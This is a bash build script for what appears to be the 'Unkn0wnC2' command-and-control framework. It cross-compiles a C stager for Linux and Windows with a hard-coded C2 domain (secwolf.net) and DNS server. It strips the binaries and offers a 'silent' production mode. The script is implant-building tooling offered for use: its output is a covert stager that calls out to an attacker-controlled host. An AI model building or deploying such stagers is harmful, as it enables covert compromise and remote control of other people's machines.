#!/bin/bash

# Unkn0wnC2 Stager Build Script
# Builds the C stager for multiple platforms

set -e

echo "=== Unkn0wnC2 Stager Build ==="
echo ""

# Check if we're in the Stager directory
if [ ! -f "stager.c" ]; then
    echo "Error: stager.c not found"
    echo "Make sure you're running this from the Stager directory"
    exit 1
fi

# Load configuration from parent directory if available
CONFIG_FILE="../build_config.json"
DNS_SERVER="8.8.8.8"
C2_DOMAIN="secwolf.net"

if [ -f "$CONFIG_FILE" ]; then
    echo "Loading configuration from build_config.json..."
    
    # Extract DNS server and domain using grep/sed
    if command -v jq &> /dev/null; then
        # Use jq if available
        C2_DOMAIN=$(jq -r '.client.server_domain // "secwolf.net"' "$CONFIG_FILE")
        DNS_SERVER=$(jq -r '.client.dns_server // "8.8.8.8"' "$CONFIG_FILE")
        if [ "$DNS_SERVER" = "" ] || [ "$DNS_SERVER" = "null" ]; then
            DNS_SERVER="8.8.8.8"
        fi
    else
        # Fallback to grep/sed
        C2_DOMAIN=$(grep -oP '"server_domain"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null || echo "secwolf.net")
        DNS_SERVER=$(grep -oP '"dns_server"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null || echo "8.8.8.8")
        if [ "$DNS_SERVER" = "" ]; then
            DNS_SERVER="8.8.8.8"
        fi
    fi
    
    echo "  DNS Server: $DNS_SERVER"
    echo "  C2 Domain:  $C2_DOMAIN"
fi

echo ""

# Check for required tools
echo "Checking build tools..."

if ! command -v gcc &> /dev/null; then
    echo "Error: gcc not found"
    exit 1
fi
echo "✓ gcc found"

# Check for cross-compilers
HAS_MINGW_64=0

if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    HAS_MINGW_64=1
    echo "✓ x86_64-w64-mingw32-gcc found (Windows x64)"
fi

echo ""

# Parse build mode
DEBUG_MODE=0
if [ "$1" = "--debug" ] || [ "$1" = "-d" ]; then
    DEBUG_MODE=1
    echo "Building in DEBUG mode (verbose output enabled)"
else
    echo "Building in PRODUCTION mode (silent operation)"
fi

# Create build output directory
BUILD_DIR="../build/stager"
mkdir -p "$BUILD_DIR"

echo "Building stagers..."
echo ""

# Build Linux x64
echo "→ Building Linux x64 stager..."
if gcc -Wall -O2 -m64 \
    -DDEBUG_MODE=$DEBUG_MODE \
    -DDNS_SERVER=\"$DNS_SERVER\" \
    -DC2_DOMAIN=\"$C2_DOMAIN\" \
    stager.c -o "$BUILD_DIR/stager-linux-x64" -lz; then
    strip -s "$BUILD_DIR/stager-linux-x64" 2>/dev/null || true
    echo "  ✓ $BUILD_DIR/stager-linux-x64"
else
    echo "  ✗ Failed to build Linux x64 stager"
    exit 1
fi

# Build Windows x64
if [ $HAS_MINGW_64 -eq 1 ]; then
    echo "→ Building Windows x64 stager..."
    x86_64-w64-mingw32-gcc -Wall -O2 -s \
        -DDEBUG_MODE=$DEBUG_MODE \
        -DDNS_SERVER=\"$DNS_SERVER\" \
        -DC2_DOMAIN=\"$C2_DOMAIN\" \
        stager.c -o "$BUILD_DIR/stager-windows-x64.exe" -lws2_32 -static
    strip "$BUILD_DIR/stager-windows-x64.exe" 2>/dev/null || true
    echo "  ✓ $BUILD_DIR/stager-windows-x64.exe"
else
    echo "  ⊘ Skipping Windows x64 (mingw-w64 not available)"
fi

echo ""
echo "=== Stager Build Complete ==="
echo ""
echo "Output directory: $BUILD_DIR"
echo ""
echo "Build modes:"
echo "  Production (silent): ./build.sh"
echo "  Debug (verbose):     ./build.sh --debug"
echo ""
echo "Note: Install mingw-w64 for Windows cross-compilation:"
echo "  Ubuntu/Debian: sudo apt-get install mingw-w64"
echo "  Fedora/RHEL:   sudo dnf install mingw64-gcc"
